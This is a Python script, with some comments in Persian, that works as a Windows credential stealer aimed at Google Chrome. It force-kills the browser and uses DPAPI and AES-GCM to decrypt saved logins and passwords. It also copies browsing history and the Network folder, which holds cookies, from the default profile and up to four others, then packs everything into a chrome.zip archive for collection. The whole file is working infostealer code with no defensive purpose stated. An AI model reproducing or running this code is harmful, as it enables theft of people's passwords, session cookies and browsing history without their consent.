import base64
import json
import os
import shutil
import sqlite3
import zipfile
from datetime import datetime, timedelta
from os import environ, path, mkdir, walk, system

import win32crypt
from Crypto.Cipher import AES

base_path = environ['USERPROFILE'] + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
path_profile = []


# _____(function)_____#
def create_zip_from_folder(folder_path, zip_filename):
    # ایجاد یک فایل ZIP جدید
    with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as new_zip:
        # پیمایش بر روی تمام فایل‌ها و زیرپوشه‌ها در پوشه
        for root, _, files in walk(folder_path):
            for file in files:
                file_path = path.join(root, file)
                # اضافه کردن فایل به فایل ZIP
                new_zip.write(file_path, arcname=path.relpath(file_path, folder_path))


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main(db_path):
    key = get_encryption_key()
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            with open(file=f'{base_path}Default\\DATA\\login data.txt', mode="a", encoding="utf-8") as f:
                f.write(
                    f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + f"\n{'=' * 50}\n")
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            with open(file=f'{base_path}Default\\DATA\\login data.txt', mode="a",
                      encoding="utf-8") as f:
                f.write(f"\nCreation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            with open(file=f'{base_path}Default\\DATA\\login data.txt', mode="a",
                      encoding="utf-8") as f:
                f.write(f"\nLast Used: {str(get_chrome_datetime(date_last_used))}\n")
        with open(file=f'{base_path}Default\\DATA\\login data.txt', mode="a", encoding="utf-8") as f:
            f.write("=" * 50 + "\n")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass


# _____(function)_____#


if path.exists(base_path + "Default"):
    system("taskkill /im chrome.exe -f")
    mkdir(base_path + "Default\\DATA")
    main(base_path + "Default\\Login Data")
    create_zip_from_folder(folder_path=base_path + "Default\\Network",
                           zip_filename=base_path + "Default\\DATA\\Network.zip")
    shutil.copy(base_path + "Default\\History", base_path + "Default\\DATA\\History")
    con = sqlite3.connect(base_path + "Default\\History")
    c = con.cursor()
    c.execute("select url, title, visit_count, last_visit_time from urls")
    results = c.fetchall()
    with open(file=f'{base_path}Default\\DATA\\History.txt', mode="a", encoding="utf-8") as f:
        for r in results:
            f.write(str(r) + "\n\n")
    c.close()
    create_zip_from_folder(folder_path=base_path + "Default\\DATA",
                           zip_filename=environ['USERPROFILE'] + "\\AppData\\Local\\Google\\Chrome\\chrome.zip")
    shutil.rmtree(f"{base_path}Default\\DATA")
else:
    base_path = environ['USERPROFILE'] + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
    path_data = environ['USERPROFILE'] + "\\AppData\\Local\\Google\\Chrome"
    for i in range(1, 5):
        if path.exists(base_path + f"Profile {i}"):
            path_profile.append(base_path + f"Profile {i}")
        else:
            break
    mkdir(path_data + "\\DATA")
    for i in path_profile:
        print(i)
        name_profile = i.split('\\')[-1]
        create_zip_from_folder(folder_path=i + "\\Network",
                               zip_filename=path_data + f"\\DATA\\{name_profile}_network.zip")
        con = sqlite3.connect(i + "\\History")
        c = con.cursor()
        c.execute("select url, title, visit_count, last_visit_time from urls")
        results = c.fetchall()
        with open(file=f'{path_data}\\DATA\\{name_profile}_History.txt', mode="a", encoding="utf-8") as f:
            for r in results:
                f.write(str(r) + "\n\n")
        c.close()


        def get_chrome_datetime(chromedate):
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # remove DPAPI str
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


        def decrypt_password(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    # not supported
                    return ""


        def main(db_path):
            key = get_encryption_key()
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            # iterate over all rows
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    with open(file=f'{path_data}\\DATA\\{name_profile}_login data.txt', mode="a",
                              encoding="utf-8") as f:
                        f.write(
                            f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + f"\n{'=' * 50}\n")
                    print(f"Origin URL: {origin_url}")
                    print(f"Action URL: {action_url}")
                    print(f"Username: {username}")
                    print(f"Password: {password}")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    with open(file=f'{path_data}\\DATA\\{name_profile}_login data.txt', mode="a",
                              encoding="utf-8") as f:
                        f.write(f"\nCreation date: {str(get_chrome_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:
                    with open(file=f'{path_data}\\DATA\\{name_profile}_login data.txt', mode="a",
                              encoding="utf-8") as f:
                        f.write(f"\nLast Used: {str(get_chrome_datetime(date_last_used))}\n")
                with open(file=f'{path_data}\\DATA\\{name_profile}_login data.txt', mode="a", encoding="utf-8") as f:
                    f.write("=" * 50 + "\n")
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass


        main(i + "\\Login Data")
        create_zip_from_folder(folder_path=path_data + "\\DATA", zip_filename=path_data + "\\chrome.zip")
